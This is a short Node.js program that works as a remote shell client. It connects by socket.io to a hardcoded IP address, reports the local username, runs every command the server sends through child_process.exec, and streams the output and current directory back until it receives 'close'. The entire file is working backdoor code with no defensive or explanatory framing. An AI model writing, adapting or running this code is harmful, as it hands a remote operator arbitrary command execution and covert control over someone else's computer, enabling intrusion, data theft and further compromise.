const client = require("socket.io-client")
const socket = client.connect("http://192.168.1.157:52907")
const child_process = require("child_process")

socket.on("connect", () => {
	// console.log("connected");
	socket.emit("commandResponse", {
		directory: "C:\\",
		client: require("os").userInfo().username,
		output: "opened connection with "+require("os").userInfo().username
	})
})

socket.on("sendCmd", (args) => {
	// enter directory, run command, get current directory
	let command = "cd " + args.directory + " && " + args.command + "&& cd"

	if(args.command == "close"){
		socket.emit("closed", {output: "closed connection", client: require("os").userInfo().username})
		process.exit()
	}
	child_process.exec(command, (stdin, stdout, stderr) => {
		let output = stdout.split("\n")
		output.pop()
		let directory = output.pop()
		output = output.join("\n")
		let packet = {
			output: output,
			directory: directory
		}
		if (stdout != "") {
			packet.directory = packet.directory.split("\r")[0]
			socket.emit("commandResponse", packet)
		} else {
			packet.output = stderr.split("\n")
			packet.output[packet.output.length - 1] = ""
			packet.output = packet.output.join("\n")
			socket.emit("commandResponse", packet)
		}
	})
})